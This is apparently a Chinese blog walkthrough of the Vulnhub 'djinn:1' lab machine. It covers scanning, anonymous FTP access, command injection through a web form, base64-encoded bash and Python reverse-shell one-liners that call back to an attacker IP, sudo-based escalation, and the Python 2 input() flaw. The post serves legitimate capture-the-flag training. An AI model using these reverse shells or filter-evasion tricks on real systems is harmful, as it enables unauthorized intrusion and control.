---
title: "djinn:1-Vulnhub Walkthrough"
categories: [ "安全技术" ]
tags: [ "靶机","walkthrough","vulhhub" ]
draft: false
slug: "517"
date: "2020-02-27 19:35:00"
---

[靶机地址][1]

靶机难度：中等
flag 数:2

## 工具及漏洞信息

- netdiscover
- nmap
- gobuster
- ftp 匿名登录下载文件
- echo 的 bash 和 python 反弹 shell
- nc 连接指定 ip 做题脚本
- sudo -l 查看当前用户权限
- .pyc 文件反编译
- input()函数漏洞
- nc 传输文件

## 0x01 信息收集

### 扫描靶机

`netdiscover`的`-r`参数扫描`192.168.1.0/16`或者路由器管理界面查看有线连接的设备得到靶机`ip`

`nmap`扫描主机及端口信息：

```
nmap -sS -A -n -T4 -p- 192.168.1.7
```

![][2]

`21`的`ftp`服务貌似可以匿名登录，因为`nmap`直接给出了`ftp`连接上后的文件内容

那我们`ftp`连接一下，查看一下这三个文件的内容：

使用`ftp ip`命令连接`ftp`服务器，用户名为匿名：`anonymous`，密码直接回车即可登录

![][3]

使用`mget *.*`下载所有文件，会确认你是否要下载，直接回车就可以，也可以直接在`ftp`交互端`cat`查看：

![][4]

得到的信息似乎是一个账号和密码，还有提示我们我们`1337`是一个游戏

`ssh`的端口状态为`filtered`就不折腾了

除此之外还有`1337`和`7331`两个端口

`1337`端口的指纹信息写着：

```
Let's see how good you are with simple maths
Answer my questions 1000 times and I'll give you your gift
```

猜测是`CTF`中常见的`nc`连接然后反弹数学题的操作，和我们上面得到的信息差不多

后面有时间的话会放一个脚本

`7331`扫描出的信息中包含`http-server-header`和`http-title`字段，猜测`http`服务开在这个端口

打开看一下，果然是：

![][5]

### 扫描漏洞信息

`nmap`扫描漏洞信息：

```
cd /usr/share/nmap/scripts/
git clone https://github.com/vulnersCom/nmap-vulners
nmap --script nmap-vulners -sV 192.168.1.7
```

![][6]

没有啥可以利用的

### 扫描路径

刚才扫描我们已经知道了`web`服务不在默认的`80`端口而是`7331`，所以扫描的时候也要记得改

gobuster 扫描路径：

```
gobuster dir -u http://192.168.1.7:7331/ -s 200,301,302 -t 50 -q -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html,.zip
```

`dirbuster`的字典可以通过下载`dirbuster`原包，然后把字典移入这个目录：

```
wget https://nchc.dl.sourceforge.net/project/dirbuster/DirBuster%20%28jar%20%2B%20lists%29/1.0-RC1/DirBuster-1.0-RC1.tar.bz2
tar -jxf DirBuster-1.0-RC1.tar.bz2
cd DirBuster-1.0-RC1/ && mkdir /usr/share/wordlists/dirbuster/ && mv *.txt /usr/share/wordlists/dirbuster/
```

![][7]

扫描出两个目录`/wish`和`/genie`，访问`ip:7331/wish`如下：

![][8]

随便输入东西之后发现跳转到`ip:7331/genie?name=`后面接上执行的命令，猜测此处存在系统命令注入

## 0x02 网站身份 getshell

既然能执行系统命令，那就直接`nc`反弹一个`shell`吧

在`msf`中快速开启监听：`handler -H 192.168.1.11 -P 3333 -p cmd/unix/reverse_bash`

![][9]

在`ip:7331/wish`中输入`nc -t -e /bin/bash 192.168.1.11 3333`

结果跳转到`genie?name=Wrong+choice+of+words`，说明屏蔽了关键词

配合`burpsuite`来探测屏蔽的关键词

- 测试 ls 得到网站根目录的文件和目录如下(%0A 是回车的 URL 编码)
- app.py
- app.pyc
- static/
- templates/

![][10]

`ls -lah`也能正常运行，说明没有屏蔽空格

`whoami`能正常的到结果`www-data`

`uname -a`知道了这是台`Ubuntu`:

![][11]

`echo whoami`可以执行，于是尝试使用

```
bash -i >& /dev/tcp/192.168.1.11/3333 0>&1
```

- bash -i 表示产生一个 bash 的交互环境
- 0>&1 将标准输入域标准输出内容相结合，然后重定向给前面的标准输出内容

或者用`python`来反弹`shell`也可以：

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.11",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

将上面的命令用`base64`加密然后在`burp`出输入以下命令：

```
echo 加密的内容 | base64 -d | bash
```

注意，此处由于网页上执行和`burp`执行有编码的差异，建议如果在`burp`上执行的话再把空格和加号用`URL`编码一下

测试后发现`python`能反弹`shell`

![][12]

## 0x03 普通用户 getshell

拿到执行网站的用户的`shell`之后第一步当然是查看当前目录文件：

![][13]

和我们前面用`burp`拦截得到的结果一样，查看了`/etc/passwd`得到两个用户`sam`和`nitish`

但是他们用户目录下的文件没有查看权限

于是回到网站根目录来，查看一下`app.py`文件的内容：

![][14]

大致内容是刚才拦截我们的函数代码，除此之外还得到一个信息：

```
/home/nitish/.dev/creds.txt
```

查看这个文件：

![][15]

得到了`nitish`账户的密码`p4ssw0rdStr3r0n9`，登录用户之前记得要开启标准的`tty`:

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

![][16]

在`nitish`用户目录下获取到第一个`flag`

## 0x04 提权 root

查看一下当前用户能执行哪些`sudo`的命令：

![][17]

当前的`nithsh账户`可以在不使用密码的情况下执行`sam`用户的`genie`脚本

看一下`genie`的用法:

![][18]

有个`-p`参数写能给我们提供`shell`，尝试一下：

```
sudo -u sam genie -p "/bin/sh"
```

![][19]

`-e`和`-p`参数都没用，再用`strings`命令查看`/usr/bin/genie`的内容

最终知道了还有个参数`-cmd`，执行命令获得`sam`的`shell`:

```
sudo -u sam /usr/bin/genie -cmd id
```

![][20]

当前账户成功切换为`sam`，那么再来看下`sam`能以`sudo`执行什么命令：

![][21]

`sam`可以执行`lago`脚本，来执行一下看一下：

第一个`Be naughty`:

![][22]

没啥乱用，第二个`Guess the number`:

![][23]

百分之一的概率，似乎比`1337`端口好弄一点，而且`python`的`input()`的话是有漏洞的

第三个`Read some damn files`

![][24]

可以读文件，但是需要知道路径，第四个`Work`:

![][25]

也没啥卵用，再试一下猜数字，不输入数字，输入其他的：

![][26]

发现竟然在输入`num`之后能查看`/root`目录了，执行`/root/proof.sh`获得`root`的`flag`

![][27]

## 0x05 获取`shell`原因解密

我们这纯属瞎猫碰死耗子，其实应该是找到`python`文件的编译文件`pyc`

> `pyc`是一种二进制文件，是由 Python 文件经过编译后所生成的文件

然后反编译出原来的`.py`文件，然后再找`input`漏洞的，常见的例子如下：

![][28]

也就是没有对输入的字符进行检测，直接按字符串处理，等于设定好的字符串即输出结果

所以我们输入`num`恰好成功说明`Guess the number`的函数代码差不多是这么写的：

```
def guess_the_number():
    input_number = input("Choose a number between 1 to 100:\nEnter your number:")
    if num == input_number:
        return True
```

我这里尝试反编译一下看是不是，查看`sam`的用户目录：

![][29]

找到一个`.pyc`文件，尝试把它反编译成`.py`文件

先把它传输到攻击机，这里使用`nc`

靶机开启监听端口并传输文件：`nc -lvp 3456 < .pyc`

目标机连接靶机并接收文件：`nc 192.168.1.6 3456 > .pyc`

![][30]

![][31]

等待几秒之后直接在靶机端`ctrl+c`结束即可

随后我们用[`uncompyle6`][32]反编译`.pyc`，它是[`uncompyle2`][33]的继承者

`uncompyle2`只专注于`python2.7`，虽然有时候准确率比`uncompyle6`高

但是大部分情况下还是`uncompyle6`准确率高，而且它已经几乎不再维护了

`uncompyle6`支持几乎你能见到的所有`python`版本，安装如下：

```
proxychains git clone https://github.com/rocky/python-uncompyle6
cd python-uncompyle6/
pip install -e .
python setup.py install
```

就安装完成了，反编译我们的`.pyc`:

```
uncompyle6 .pyc -o exp.py
```

![][34]

果然和我前面猜测的差不多

参考文章：

- [VulnHub 靶机系列实战教程][35]
- [原创干货 | 从 0 到 1 靶机实战之 djnni][36]
- [Vulnerability in input() function – Python 2.x][37]

本文完。

[1]: https://www.vulnhub.com/entry/djinn-1,397/
[2]: https://img.soapffz.com/archives_img/2020/02/27/archives_20200227_210818.png
[3]: https://img.soapffz.com/archives_img/2020/02/27/archives_20200227_212143.png
[4]: https://img.soapffz.com/archives_img/2020/02/27/archives_20200227_212347.png
[5]: https://img.soapffz.com/archives_img/2020/02/27/archives_20200227_214145.png
[6]: https://img.soapffz.com/archives_img/2020/02/27/archives_20200227_213957.png
[7]: https://img.soapffz.com/archives_img/2020/02/27/archives_20200227_215754.png
[8]: https://img.soapffz.com/archives_img/2020/02/27/archives_20200227_220126.png
[9]: https://img.soapffz.com/archives_img/2020/02/27/archives_20200227_220800.png
[10]: https://img.soapffz.com/archives_img/2020/02/27/archives_20200227_221444.png
[11]: https://img.soapffz.com/archives_img/2020/02/27/archives_20200228_105823.png
[12]: https://img.soapffz.com/archives_img/2020/02/27/archives_20200228_114244.png
[13]: https://img.soapffz.com/archives_img/2020/02/27/archives_20200228_112545.png
[14]: https://img.soapffz.com/archives_img/2020/02/27/archives_20200228_114533.png
[15]: https://img.soapffz.com/archives_img/2020/02/27/archives_20200228_114827.png
[16]: https://img.soapffz.com/archives_img/2020/02/27/archives_20200228_115443.png
[17]: https://img.soapffz.com/archives_img/2020/02/27/archives_20200228_115709.png
[18]: https://img.soapffz.com/archives_img/2020/02/27/archives_20200228_115851.png
[19]: https://img.soapffz.com/archives_img/2020/02/27/archives_20200228_120342.png
[20]: https://img.soapffz.com/archives_img/2020/02/27/archives_20200228_120958.png
[21]: https://img.soapffz.com/archives_img/2020/02/27/archives_20200228_143818.png
[22]: https://img.soapffz.com/archives_img/2020/02/27/archives_20200228_144107.png
[23]: https://img.soapffz.com/archives_img/2020/02/27/archives_20200228_144206.png
[24]: https://img.soapffz.com/archives_img/2020/02/27/archives_20200228_144257.png
[25]: https://img.soapffz.com/archives_img/2020/02/27/archives_20200228_144354.png
[26]: https://img.soapffz.com/archives_img/2020/02/27/archives_20200228_145102.png
[27]: https://img.soapffz.com/archives_img/2020/02/27/archives_20200228_145215.png
[28]: https://img.soapffz.com/archives_img/2020/02/27/archives_20200228_150225.png
[29]: https://img.soapffz.com/archives_img/2020/02/27/archives_20200228_150844.png
[30]: https://img.soapffz.com/archives_img/2020/02/27/archives_20200228_163751.png
[31]: https://img.soapffz.com/archives_img/2020/02/27/archives_20200228_163904.png
[32]: https://github.com/rocky/python-uncompyle6
[33]: https://github.com/wibiti/uncompyle2
[34]: https://img.soapffz.com/archives_img/2020/02/27/archives_20200228_165306.png
[35]: https://mp.weixin.qq.com/s/skCNWPiEPgJcHXSmsif5qQ
[36]: https://mp.weixin.qq.com/s/eYpX2BI7eriKyMQ3M--MTw
[37]: https://www.geeksforgeeks.org/vulnerability-input-function-python-2-x/